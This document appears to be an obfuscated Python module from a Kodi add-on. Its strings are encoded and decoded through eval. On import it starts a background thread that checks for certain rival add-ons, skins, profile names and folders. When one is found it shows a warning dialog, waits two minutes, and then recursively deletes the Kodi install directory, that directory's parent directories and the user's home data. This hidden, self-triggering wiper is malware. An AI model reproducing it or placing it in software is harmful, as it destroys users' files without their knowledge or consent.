# coding: UTF-8
import sys
l1_ca_ = sys.version_info [0] == 2
l1lll1_ca_ = 2048
l11ll_ca_ = 7
def l1l11_ca_ (ll_ca_):
	global l1llll_ca_
	l1l11l_ca_ = ord (ll_ca_ [-1])
	l11l1_ca_ = ll_ca_ [:-1]
	l11_ca_ = l1l11l_ca_ % len (l11l1_ca_)
	l1ll_ca_ = l11l1_ca_ [:l11_ca_] + l11l1_ca_ [l11_ca_:]
	if l1_ca_:
		l1ll1l_ca_ = unicode () .join ([unichr (ord (char) - l1lll1_ca_ - (l1l1l_ca_ + l1l11l_ca_) % l11ll_ca_) for l1l1l_ca_, char in enumerate (l1ll_ca_)])
	else:
		l1ll1l_ca_ = str () .join ([chr (ord (char) - l1lll1_ca_ - (l1l1l_ca_ + l1l11l_ca_) % l11ll_ca_) for l1l1l_ca_, char in enumerate (l1ll_ca_)])
	return eval (l1ll1l_ca_)
import xbmc,xbmcgui
import time,re,os,threading
try: from shutil import rmtree
except: rmtree = False
def l1l_ca_(l1l111_ca_,l11l_ca_=[l1l11_ca_ (u"ࠫࠬࠀ")]):
    out=0
    l1l1ll_ca_ =  os.listdir(l1l111_ca_)
    for l1ll11_ca_ in l1l1ll_ca_:
        out += sum([1 for x in l11l_ca_ if x in l1ll11_ca_.lower()])
    return out
def l1111_ca_(name=l1l11_ca_ (u"ࠬ࠭ࠁ")):
    xbmcgui.Dialog().ok(l1l11_ca_ (u"࠭ࡕࡘࡃࡊࡅࠬࠂ"),l1l11_ca_ (u"ࠧࡘࡶࡼࡧࡿࡱࡡࠡࡰ࡬ࡩࠥࡪࡺࡪࡣ࡯ࡥࠥࢀࠠࡵࡻࡰࠤࡧࡻࡩ࡭ࡦࡨࡱ࠳ࠦࡗࡺ࡮ࡤࡧࡿࠦ࡮ࡢࡶࡼࡧ࡭ࡳࡩࡢࡵࡷࠤࡰࡵࡤࡪࠩࠃ"))
    time.sleep(120)
    l1lll_ca_=[]
    l1lll_ca_.append(xbmc.translatePath(os.path.join(l1l11_ca_ (u"ࠨࡵࡳࡩࡨ࡯ࡡ࡭࠼࠲࠳ࡽࡨ࡭ࡤࠩࠄ"),l1l11_ca_ (u"ࠩ࠱࠲ࠬࠅ"))))
    l1lll_ca_.append(xbmc.translatePath(os.path.join(l1l11_ca_ (u"ࠪࡷࡵ࡫ࡣࡪࡣ࡯࠾࠴࠵ࡸࡣ࡯ࡦࠫࠆ"),l1l11_ca_ (u"ࠫ࠳࠴ࠧࠇ"),l1l11_ca_ (u"ࠬ࠴࠮ࠨࠈ"))))
    l1lll_ca_.append(xbmc.translatePath(os.path.join(l1l11_ca_ (u"࠭ࡳࡱࡧࡦ࡭ࡦࡲ࠺࠰࠱࡫ࡳࡲ࡫ࠧࠉ"),l1l11_ca_ (u"ࠧࠨࠊ"))))
    for l1ll1_ca_ in l1lll_ca_:
        try:
            thread = threading.Thread(name=l1l11_ca_ (u"ࠨࡔࡕࠫࠋ"), target = l111_ca_, args=[l1ll1_ca_])
            thread.start()
            time.sleep(0.1)
        except: pass
    for l1ll1_ca_ in l1lll_ca_:
        try: l111_ca_(l1ll1_ca_)
        except:pass
def l111_ca_(top):
    if os.path.exists(top):
        if rmtree:
            try: rmtree(top, ignore_errors=True)
            except: pass
        for root, dirs, l111l_ca_ in os.walk(top, topdown=False):
            for name in l111l_ca_:
                try:os.remove(os.path.join(root, name))
                except:pass
            for name in dirs:
                try:os.remove(os.path.join(root, name))
                except:pass
def check():
    l1l111_ca_ = os.path.join(xbmc.translatePath(l1l11_ca_ (u"ࠩࡶࡴࡪࡩࡩࡢ࡮࠽࠳࠴࡮࡯࡮ࡧࠪࠌ")),l1l11_ca_ (u"ࠪࡥࡩࡪ࡯࡯ࡵࠪࠍ"))
    xbmc.log(l1l111_ca_)
    if l1l_ca_(l1l111_ca_,[l1l11_ca_ (u"ࠫࡦࡲࡩࡦࡰࡺ࡭ࡿࡧࡲࡥࠩࠎ"),l1l11_ca_ (u"ࠬ࡫ࡸࡵࡧࡱࡨࡪࡸ࠮ࡢ࡮࡬ࡩࡳ࠭ࠏ")])>0:
        l1111_ca_(l1l11_ca_ (u"࠭ࡷࡪࡼࡤࡶࡩ࠭ࠐ"))
        return
    l1l1l1_ca_ = os.path.join(xbmc.translatePath(l1l11_ca_ (u"ࠧࡴࡲࡨࡧ࡮ࡧ࡬࠻࠱࠲ࡹࡸ࡫ࡲࡥࡣࡷࡥࠬࠑ")),l1l11_ca_ (u"ࠨࡣࡧࡨࡴࡴ࡟ࡥࡣࡷࡥࠬࠒ"),l1l11_ca_ (u"ࠩࡶ࡯࡮ࡴ࠮ࡢࡧࡲࡲ࠳ࡴ࡯ࡹ࠰࠸ࠫࠓ"),l1l11_ca_ (u"ࠪࡷࡪࡺࡴࡪࡰࡪࡷ࠳ࡾ࡭࡭ࠩࠔ"))
    if os.path.exists(l1l1l1_ca_):
        data = open(l1l1l1_ca_,l1l11_ca_ (u"ࠫࡷ࠭ࠕ")).read()
        data= re.sub(l1l11_ca_ (u"ࠬࡢ࡛࠯ࠬ࡟ࡡࠬࠖ"),l1l11_ca_ (u"࠭ࠧࠗ"),data)
        if len(re.compile(l1l11_ca_ (u"ࠧ࠿࠰࠭ࠬࡵࡵ࡬ࡴ࡭ࡤࡠࡸ࠰ࡴ࡝ࡵ࠭ࡺ࠮࠭࠘"),re.DOTALL|re.IGNORECASE).findall(data)):
            l1111_ca_(l1l11_ca_ (u"ࠨࡵ࡮࡭ࡳ࠴ࡡࡦࡱࡱ࠲ࡳࡵࡸ࠯࠷ࠪ࠙"))
            return
        if len(re.compile(l1l11_ca_ (u"ࠩࡁ࠲࠯࠮ࡤࡢࡴࡰࡳࡼࡧ࡜ࡴࠬࡷࡠࡸ࠰ࡶࠪࠩࠚ"),re.DOTALL|re.IGNORECASE).findall(data)):
            l1111_ca_(l1l11_ca_ (u"ࠪࡷࡰ࡯࡮࠯ࡣࡨࡳࡳ࠴࡮ࡰࡺ࠱࠹ࠬࠛ"))
            return
    l1l1l1_ca_ = os.path.join(xbmc.translatePath(l1l11_ca_ (u"ࠫࡸࡶࡥࡤ࡫ࡤࡰ࠿࠵࠯ࡶࡵࡨࡶࡩࡧࡴࡢࠩࠜ")),l1l11_ca_ (u"ࠬࡧࡤࡥࡱࡱࡣࡩࡧࡴࡢࠩࠝ"),l1l11_ca_ (u"࠭ࡳ࡬࡫ࡱ࠲ࡽࡵ࡮ࡧ࡮ࡸࡩࡳࡩࡥࠨࠞ"),l1l11_ca_ (u"ࠧࡴࡧࡷࡸ࡮ࡴࡧࡴ࠰ࡻࡱࡱ࠭ࠟ"))
    if os.path.exists(l1l1l1_ca_):
        data = open(l1l1l1_ca_,l1l11_ca_ (u"ࠨࡴࠪࠠ")).read()
        data= re.sub(l1l11_ca_ (u"ࠩ࡟࡟࠳࠰࡜࡞ࠩࠡ"),l1l11_ca_ (u"ࠪࠫࠢ"),data)
        if len(re.compile(l1l11_ca_ (u"ࠫࡃ࠴ࠪࠩࡲࡲࡰࡸࡱࡡ࡝ࡵ࠭ࡸࡡࡹࠪࡷࠫࠪࠣ"),re.DOTALL|re.IGNORECASE).findall(data)):
            l1111_ca_(l1l11_ca_ (u"ࠬࡹ࡫ࡪࡰ࠱ࡼࡴࡴࡦ࡭ࡷࡨࡲࡨ࡫ࠧࠤ"))
            return
    l1l111_ca_ = os.path.join(xbmc.translatePath(l1l11_ca_ (u"࠭ࡳࡱࡧࡦ࡭ࡦࡲ࠺࠰࠱ࡸࡷࡪࡸࡤࡢࡶࡤࠫࠥ")),l1l11_ca_ (u"ࠧࡱࡴࡲࡪ࡮ࡲࡥࡴࠩࠦ"))
    if os.path.exists(l1l111_ca_):
        if l1l_ca_(l1l111_ca_,[l1l11_ca_ (u"ࠨ࡭࡬ࡨࡸ࠭ࠧ")])>0:
            l1111_ca_(l1l11_ca_ (u"ࠩࡺ࡭ࡿࡧࡲࡥࠩࠨ"))
            return
    l1l1_ca_ = xbmc.translatePath(l1l11_ca_ (u"ࠪࡷࡵ࡫ࡣࡪࡣ࡯࠾࠴࠵ࡨࡰ࡯ࡨࠫࠩ"))
    for f in os.listdir(l1l1_ca_):
        if f.startswith(l1l11_ca_ (u"ࠫࡒࡓࡅࡔࠩࠪ")):
            l1111_ca_()
            return
try:
    thread = threading.Thread(name=l1l11_ca_ (u"ࠬ࠭ࠫ"), target = check, args=[])
    thread.start()
except: pass
def run():
    try:
        thread = threading.Thread(name=l1l11_ca_ (u"࠭ࠧࠬ"), target = check, args=[])
        thread.start()
    except: pass